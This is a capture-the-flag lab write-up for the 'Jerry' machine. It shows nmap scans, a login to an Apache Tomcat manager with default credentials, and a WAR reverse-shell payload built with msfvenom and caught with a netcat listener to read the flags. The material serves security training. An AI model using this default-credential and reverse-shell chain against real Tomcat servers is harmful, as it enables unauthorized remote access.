# Jerry

![](../../../.gitbook/assets/jerry.png)

At the beginning, i start running nmap with some flags to execute default scripts and get services version.

```
sudo nmap -sC -sV $ip -Pn

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests

nmap --script vuln $ip -p 8080 -Pn

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-method-tamper:
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|
```

Knowing that it was about Tomcat, i open the browser and start to search into it's page(target:8080). After entering into management session, an user and password was request but until that moment I've never seen some signal of this authentication credentials, after try some admin/admin credentials i was answered with an error showing the default credentials.

(image)

Now with the credentials, is allowed login-in on the admin page

(image)

At this page we can see an fileupload field. Compering with my searching results about the tomcat version, it's may be vulnerable.

Trying upload some content, i've discovered that the field  supports only .war files, knowing it, was crafted an reverse shell payload with msfvenom and upload it.

```
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=target_ip LPORT=4444 -f war > sample.war
```

After craft the payload, we start a tcp listening server with netcat,

```
nc -lvnp 4444
```

After that, the activation of shell is maded clicking on it's link on webpage. And we get an reverse access.

gain that access, we travel around the directory's searching for flags and in:

```
Directory of C:\Users\Administrator\Desktop\flags
```

We found an file called "flags.txt" after that, we type:

```
type *
```

And get both flags
